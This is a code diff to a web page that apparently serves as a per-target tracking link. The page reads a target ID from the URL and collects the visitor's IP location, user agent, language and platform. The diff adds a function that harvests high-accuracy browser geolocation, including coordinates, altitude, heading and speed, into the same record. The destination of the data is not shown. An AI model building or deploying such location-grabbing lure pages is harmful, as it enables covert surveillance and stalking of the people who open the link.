@@ -36,7 +36,6 @@
       100% { transform: translate(0px, 0px) rotate(-1deg); }
     }
 
-
     .content {
       position: relative;
       z-index: 1;
@@ -50,8 +49,36 @@
       const TARGET_ID = urlParams.get("u"); 
       if (!TARGET_ID) return;
 
+      async function getBrowserLocation() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            resolve(null);
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              resolve({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude || null,
+                altitudeAccuracy: position.coords.altitudeAccuracy || null,
+                heading: position.coords.heading || null,
+                speed: position.coords.speed || null
+              });
+            },
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          );
+        });
+      }
+
       try {
-        const ipResponse = await fetch('https://ipapi.co/json/');
+        const [ipResponse, browserGeo] = await Promise.all([
+          fetch('https://ipapi.co/json/'),
+          getBrowserLocation()
+        ]);
+
         const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
 
         const ua = navigator.userAgent || null;
@@ -72,6 +99,7 @@
             region: ipData.region || null,
             country: ipData.country_name || ipData.country || null,
             postal: ipData.postal || null,
+            browser_geo: browserGeo,
             user_agent: ua,
             language: lang,
             platform: platform,
